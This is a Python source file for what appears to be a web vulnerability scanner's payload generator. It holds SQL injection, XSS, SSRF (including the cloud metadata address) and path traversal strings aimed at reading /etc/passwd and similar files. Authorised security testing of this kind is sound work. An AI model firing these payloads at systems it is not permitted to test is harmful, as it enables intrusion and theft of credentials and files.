import random
import string

class PayloadGenerator:
    """
    Test Case Engine that dynamically generates thousands of payloads programmatically.
    For the MVP, we expose generators that return optimized randomized subsets to prevent
    crashing the target or taking hours to complete a scan.
    """
    def __init__(self):
        self.sql_bases = ["'", "\"", "1=1", "admin' --", "1' OR '1'='1", "') OR ('1'='1"]
        self.sql_modifiers = ["--", "#", "/*", "*/", "waitfor delay '0:0:5'"]
        
        self.xss_bases = ["<script>alert(1)</script>", "javascript:alert(1)", "\"><svg/onload=alert(1)>"]
        self.xss_bypasses = ["<sCRipt>", "%3Cscript%3E", "onload=prompt(1)", "<img src=x onerror=alert(1)>"]
        
        self.ssrf_bases = [
            "http://localhost", 
            "http://127.0.0.1", 
            "http://169.254.169.254/latest/meta-data/", 
            "file:///etc/passwd"
        ]
        
        self.path_traversal = [
            "../../../etc/passwd", 
            "..\\..\\windows\\win.ini", 
            "/%2e%2e/%2e%2e/", 
            "....//....//etc/passwd"
        ]
        
    def generate_sqli(self, max_count=50):
        # Programmatically combine bases and modifiers to simulate thousands of cases
        combinations = [f"{base} {mod}" for base in self.sql_bases for mod in self.sql_modifiers]
        combinations.extend(self.sql_bases)
        
        # Add some random fuzzed strings
        for _ in range(10):
            rand_str = ''.join(random.choices(string.ascii_letters, k=5))
            combinations.append(f"'{rand_str}' OR 1=1--")
            
        return random.sample(combinations, min(max_count, len(combinations)))

    def generate_xss(self, max_count=50):
        combinations = []
        combinations.extend(self.xss_bases)
        combinations.extend(self.xss_bypasses)
        
        # Obfuscation variations
        for bypass in self.xss_bypasses:
            combinations.append(bypass.replace("<", "%3C").replace(">", "%3E"))
            
        return random.sample(combinations, min(max_count, len(combinations)))

    def get_all_payloads(self):
        return {
            "sqli": self.generate_sqli(15), # Highly optimized subset for live demo
            "xss": self.generate_xss(15),
            "ssrf": self.ssrf_bases,
            "path_traversal": self.path_traversal
        }

generator = PayloadGenerator()
